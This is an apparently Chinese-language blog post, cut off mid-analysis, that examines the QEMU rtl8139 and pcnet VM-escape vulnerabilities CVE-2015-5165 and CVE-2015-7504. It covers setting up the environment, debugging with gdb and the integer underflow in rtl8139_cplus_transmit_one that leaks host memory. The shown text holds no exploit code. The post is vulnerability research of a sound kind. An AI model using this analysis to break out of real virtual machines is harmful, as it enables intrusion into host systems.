<!DOCTYPE html>
<html lang="">
    <!-- title -->




<!-- keywords -->




<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="MozhuCY">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="MozhuCY">
    
    <meta name="keywords" content="mozhucy,reverse,ctf,X1cT34m">
    
    <meta name="description" content>
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>CVE-2015-7504 CVE-2015-5165QEMU虚拟机逃逸漏洞分析 · MozhuCY&#39;s blog</title>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href="/assets/favicon.ico">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js" as="script">
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
    
    <!-- fancybox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
</head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/" >MozhuCY&#39;s blog.</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">CVE-2015-7504 CVE-2015-5165QEMU虚拟机逃逸漏洞分析</a>
            </div>
    </div>
    
    <a class="home-link" href=/>MozhuCY's blog.</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style="







height:50vh;
">
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            CVE-2015-7504 CVE-2015-5165QEMU虚拟机逃逸漏洞分析
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                
                    <div class="post-intro-read">
                        <span>字数统计: <span class="post-count word-count">6.7k</span>阅读时长: <span class="post-count reading-time">37 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                    <span class="post-intro-time">1970/01/01</span>
                    
                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                        <span class="iconfont-archer">&#xe602;</span>
                        <span id="busuanzi_value_page_pv"></span>
                    </span>
                    
                    <span class="shareWrapper">
                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
                        <span class="shareText">Share</span>
                        <ul class="shareList">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>
        <script>
 
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IE内核
        presto: u.indexOf('Presto') > -1, //opera内核
        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
        iPad: u.indexOf('iPad') > -1, //是否为iPad
        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in');
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //所有字体开始加载
          // console.log('loading');
        },
        active: function () {  //所有字体已渲染
          fontLoaded();
        },
        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <h1 id="QEMU"><a href="#QEMU" class="headerlink" title="QEMU"></a>QEMU</h1><ul>
<li>QEMU是一套模拟处理器,在Linux平台上使用广泛,一般虚拟机的漏洞分为两大类,DoS和逃逸,其中逃逸的漏洞威胁最大,但是挖掘难度也很大.</li>
<li>漏洞多出现于IO部分的模拟,因为交互需要许多长度未定的数据,所以在数据处理的代码中,往往会出现一些类似于溢出的漏洞,一般通过这些溢出,就能达到使虚拟机crash的目的</li>
</ul>
<h1 id="分析目的"><a href="#分析目的" class="headerlink" title="分析目的"></a>分析目的</h1><ul>
<li>这里想要通过已经给出POC的漏洞,以及qemu开源的优势来熟悉虚拟机漏洞的成因以及原理,方便以后对于不同种类虚拟机的漏洞挖掘</li>
</ul>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
<li>卡在这里好久,一直是VNC server running on 127.0.0.1:5900,缺少SDL库,一开始按照网上的教程apt安装了一下,但是还是会出现SDL support no,后来发现还有另一个高版本的SDL库,安装之后重新编译就搞定了.</li>
<li>qemu源码编译没什么问题了,因为是下的压缩包,不知道为什么代码被改了一点,直接checkout到漏洞分支不太行,先add commit再checkout</li>
<li>ubuntu换了阿里源,一些依赖解决的还好,然后顺利编译好有漏洞版本的qemu,注意漏洞在pcnet网卡里,在checkout后备份一份源码</li>
<li>然后需要一个优秀的qcow2镜像文件,直接使用iso生成qcow2太麻烦了,还好qemu-img支持vmdk格式虚拟机到qemu虚拟机的转换,直接用vmware给的vmware-vdiskmanager.exe进行转换<code>vmware-vdiskmanager.exe -r &quot;D:\vm\Ubuntu 64 位.vmdk&quot; -t 0 &quot;D:\ubuntu.vmdk</code>,将vmdk合并以后,放到虚拟机里,然后qemu-img,<code>qemu-img convert -f vmdk -O qcow2 input.vmdk output.qcow2</code></li>
<li>然后就需要启动了,这里要指定两个网卡,由于漏洞分别处于pcnet(CVE-2015-7504)与rtl8139(CVE-2015-5165),若需要加快qemu,则需要加上-enable-kvm,注意这个enable kvm需要虚拟机对kvm的支持,在vmware编辑开启虚拟化即可</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 -enable-kvm -m 2048 \</span><br><span class="line">-netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \</span><br><span class="line">-netdev user,id=t1, -device pcnet,netdev=t1,id=nic1 \</span><br><span class="line">-drive file=&lt;path_to_image&gt;,format=qcow2,if=ide,cache=writeback</span><br></pre></td></tr></table></figure>
<ul>
<li>启动成功</li>
</ul>
<h2 id="qemu调试方法"><a href="#qemu调试方法" class="headerlink" title="qemu调试方法"></a>qemu调试方法</h2><ul>
<li><code>gdb qemu-system-x86</code>-x start.sh</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> args -<span class="built_in">enable</span>-kvm -m 2048 -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 -drive file=/home/mozhucy/Desktop/qemu-exp.qcow2,format=qcow2,<span class="keyword">if</span>=ide,cache=writeback</span><br><span class="line"></span><br><span class="line"><span class="built_in">break</span> hw/net/rtl8139.c:2173</span><br><span class="line"></span><br><span class="line">r</span><br></pre></td></tr></table></figure>
<h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>有的时候需要把exp传到虚拟机中,但是最近几次的调试过程中,发生了一些问题.qemu中的网络与外部不通,也就是ping不同10.0.2.2 ifconfig -a后,发现另外一个网卡变成了ens33,还需要把这个改回eth0,方法如下:</p>
<p>vim /etc/default/grub 将GRUB_CMDLINE_LINUX=””引号内容替换成net.ifnames=0 biosdevname=0</p>
<p>然后grub-mkconfig -o /boot/grub/grub.cfg</p>
<p>然后编辑/etc/network/interface 将ens33改成eth0,然后重启虚拟机,重启.</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="cve-2015-5165"><a href="#cve-2015-5165" class="headerlink" title="cve-2015-5165"></a>cve-2015-5165</h2><p>这是一个虚拟机网卡出现的漏洞,漏洞出现在rtl8139网卡的模拟中,在函数static int rtl8139_cplus_transmit_one(RTL8139State *s)中,在传输TCP包的时候,对于协议解析的过程中,存在一个整形溢出,可以导致leak,详情漏洞如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtl8139_cplus_transmit_one</span><span class="params">(RTL8139State *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> 	...</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">uint8_t</span> *saved_buffer  = s-&gt;cplus_txbuffer;</span><br><span class="line">    <span class="keyword">int</span>      saved_size    = s-&gt;cplus_txbuffer_offset;</span><br><span class="line">    <span class="keyword">int</span>      saved_buffer_len = s-&gt;cplus_txbuffer_len;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_header</span> *<span class="title">ip</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="keyword">int</span> hlen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span>  ip_protocol = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> ip_data_len = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint8_t</span> *eth_payload_data = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">size_t</span>   eth_payload_len  = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">    eth_payload_data = saved_buffer + ETH_HLEN;</span><br><span class="line">    eth_payload_len  = saved_size   - ETH_HLEN; </span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">       </span><br><span class="line">    ip = (struct ip_header*)eth_payload_data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123;</span><br><span class="line">        DPRINTF(<span class="string">"+++ C+ mode packet has bad IP version %d "</span></span><br><span class="line">                <span class="string">"expected %d\n"</span>, IP_HEADER_VERSION(ip),</span><br><span class="line">                IP_HEADER_VERSION_4);</span><br><span class="line">        <span class="keyword">goto</span> skip_offload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hlen = IP_HDR_GET_LEN(ip);</span><br><span class="line">    <span class="keyword">if</span> (hlen &lt; <span class="keyword">sizeof</span>(struct ip_header) || hlen &gt; eth_payload_len) &#123;</span><br><span class="line">        <span class="keyword">goto</span> skip_offload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ip_protocol = ip-&gt;ip_p;</span><br><span class="line"></span><br><span class="line">    ip_data_len = be16_to_cpu(ip-&gt;ip_len);</span><br><span class="line">    <span class="keyword">if</span> (ip_data_len &lt; hlen || ip_data_len &gt; eth_payload_len) &#123;</span><br><span class="line">        <span class="keyword">goto</span> skip_offload;</span><br><span class="line">    &#125;</span><br><span class="line">    ip_data_len -= hlen;</span><br><span class="line">    </span><br><span class="line">    ....</span><br><span class="line">      </span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在rtl8139_cplus_transmit_one中,函数会解析txbuffer中的网络数据包,在解析ip协议的时候,存在这样的一个计算<code>ip_data_len -= hlen</code> 其中ip_data_len和hlen分别是ip_header中的两个可控数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_header</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span>  ip_ver_len;     <span class="comment">/* version and header length */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>  ip_tos;         <span class="comment">/* type of service */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ip_len;         <span class="comment">/* total length */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ip_id;          <span class="comment">/* identification */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ip_off;         <span class="comment">/* fragment offset field */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>  ip_ttl;         <span class="comment">/* time to live */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>  ip_p;           <span class="comment">/* protocol */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ip_sum;         <span class="comment">/* checksum */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ip_src, ip_dst; <span class="comment">/* source and destination address */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>也就是ip_ver_len中的len减去ip_len,但是在计算的过程中,函数并没有检测两者的大小,在正常的网络包中,ip_ver_len是一定比ip_data_len小的,因为通常情况下的网络数据包是这样子的.<br><img src="http://47.106.144.114/wp-content/uploads/2020/02/1578986856105.png" alt><br>即ip_len是ip头长度加上tcp头长度加上数据长度,但是在这里,如果我们使得ip_data_len小于hlen,则会发生一个整形溢出,即ip_data_len = 0x13,hlen=0x14的时候,计算后ip_data_len结果为-1,从代码中可以看到ip_data_len的数据类型为uint16_t,即0xffff.</p>
<p>在后续的计算中,ip_data_len又被用来计算tcp包的大小,代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> tcp_data_len = ip_data_len - tcp_hlen;</span><br><span class="line"><span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (tcp_send_offset = <span class="number">0</span>; tcp_send_offset &lt; tcp_data_len; tcp_send_offset += tcp_chunk_size)</span><br><span class="line">&#123;</span><br><span class="line">    ....</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> (tcp_send_offset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen, (<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ....</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> tso_send_size = ETH_HLEN + hlen + tcp_hlen + chunk_size;</span><br><span class="line">    DPRINTF(<span class="string">"+++ C+ mode TSO transferring packet size "</span></span><br><span class="line">            <span class="string">"%d\n"</span>, tso_send_size);</span><br><span class="line">    rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">                           <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* add transferred count to TCP sequence number */</span></span><br><span class="line">    stl_be_p(&amp;p_tcp_hdr-&gt;th_seq,</span><br><span class="line">             chunk_size + ldl_be_p(&amp;p_tcp_hdr-&gt;th_seq));</span><br><span class="line">    ++send_count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这里,ip_data_len又被用来计算tcp_data_len的长度,tcp_data_len计算过程为ip_data_len减去</p>
<p>tcp_hlen,因为tcp头中不存在记录长度的区域,所以tcp的长度计算由ip头计算.然后在memcpy rtl8139_transfer_frame 的时候,会多发送许多个包,然后我们便可以在Rxbuffer中读到这些数据.</p>
<p>也就是说,现在我们需要使用网卡发送一个数据,然后去接收,那么就涉及到了一个操作网卡的问题.这里我们要用端口操作,使用<code>io*() in*()</code>等函数进行操作,在/proc/ioports可以看到:<br><img src="http://47.106.144.114/wp-content/uploads/2020/02/1579013285478.png" alt><br>可以看到c000-c0ff为8139网卡的端口范围,对rtl8139网卡操作的端口编号如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> RTL8139_registers &#123;</span><br><span class="line">    MAC0 = <span class="number">0</span>,        <span class="comment">/* Ethernet hardware address. */</span></span><br><span class="line">    MAR0 = <span class="number">8</span>,        <span class="comment">/* Multicast filter. */</span></span><br><span class="line">    TxStatus0 = <span class="number">0x10</span>,<span class="comment">/* Transmit status (Four 32bit registers). C mode only */</span></span><br><span class="line">                     <span class="comment">/* Dump Tally Conter control register(64bit). C+ mode only */</span></span><br><span class="line">    TxAddr0 = <span class="number">0x20</span>,  <span class="comment">/* Tx descriptors (also four 32bit). */</span></span><br><span class="line">    RxBuf = <span class="number">0x30</span>,</span><br><span class="line">    ChipCmd = <span class="number">0x37</span>,</span><br><span class="line">    RxBufPtr = <span class="number">0x38</span>,</span><br><span class="line">    RxBufAddr = <span class="number">0x3A</span>,</span><br><span class="line">    IntrMask = <span class="number">0x3C</span>,</span><br><span class="line">    IntrStatus = <span class="number">0x3E</span>,</span><br><span class="line">    TxConfig = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig = <span class="number">0x44</span>,</span><br><span class="line">    Timer = <span class="number">0x48</span>,        <span class="comment">/* A general-purpose counter. */</span></span><br><span class="line">    RxMissed = <span class="number">0x4C</span>,    <span class="comment">/* 24 bits valid, write clears. */</span></span><br><span class="line">    Cfg9346 = <span class="number">0x50</span>,</span><br><span class="line">    Config0 = <span class="number">0x51</span>,</span><br><span class="line">    Config1 = <span class="number">0x52</span>,</span><br><span class="line">    FlashReg = <span class="number">0x54</span>,</span><br><span class="line">    MediaStatus = <span class="number">0x58</span>,</span><br><span class="line">    Config3 = <span class="number">0x59</span>,</span><br><span class="line">    Config4 = <span class="number">0x5A</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    HltClk = <span class="number">0x5B</span>,</span><br><span class="line">    MultiIntr = <span class="number">0x5C</span>,</span><br><span class="line">    PCIRevisionID = <span class="number">0x5E</span>,</span><br><span class="line">    TxSummary = <span class="number">0x60</span>, <span class="comment">/* TSAD register. Transmit Status of All Descriptors*/</span></span><br><span class="line">    BasicModeCtrl = <span class="number">0x62</span>,</span><br><span class="line">    BasicModeStatus = <span class="number">0x64</span>,</span><br><span class="line">    NWayAdvert = <span class="number">0x66</span>,</span><br><span class="line">    NWayLPAR = <span class="number">0x68</span>,</span><br><span class="line">    NWayExpansion = <span class="number">0x6A</span>,</span><br><span class="line">    <span class="comment">/* Undocumented registers, but required for proper operation. */</span></span><br><span class="line">    FIFOTMS = <span class="number">0x70</span>,        <span class="comment">/* FIFO Control and test. */</span></span><br><span class="line">    CSCR = <span class="number">0x74</span>,        <span class="comment">/* Chip Status and Configuration Register. */</span></span><br><span class="line">    PARA78 = <span class="number">0x78</span>,</span><br><span class="line">    PARA7c = <span class="number">0x7c</span>,        <span class="comment">/* Magic transceiver parameter register. */</span></span><br><span class="line">    Config5 = <span class="number">0xD8</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    <span class="comment">/* C+ mode */</span></span><br><span class="line">    TxPoll        = <span class="number">0xD9</span>,    <span class="comment">/* Tell chip to check Tx descriptors for work */</span></span><br><span class="line">    RxMaxSize    = <span class="number">0xDA</span>, <span class="comment">/* Max size of an Rx packet (8169 only) */</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>, <span class="comment">/* C+ Command register (C+ mode only) */</span></span><br><span class="line">    IntrMitigate    = <span class="number">0xE2</span>,    <span class="comment">/* rx/tx interrupt mitigation control */</span></span><br><span class="line">    RxRingAddrLO    = <span class="number">0xE4</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    RxRingAddrHI    = <span class="number">0xE8</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    TxThresh    = <span class="number">0xEC</span>, <span class="comment">/* Early Tx threshold */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>而io端口操作处理函数如下</p>
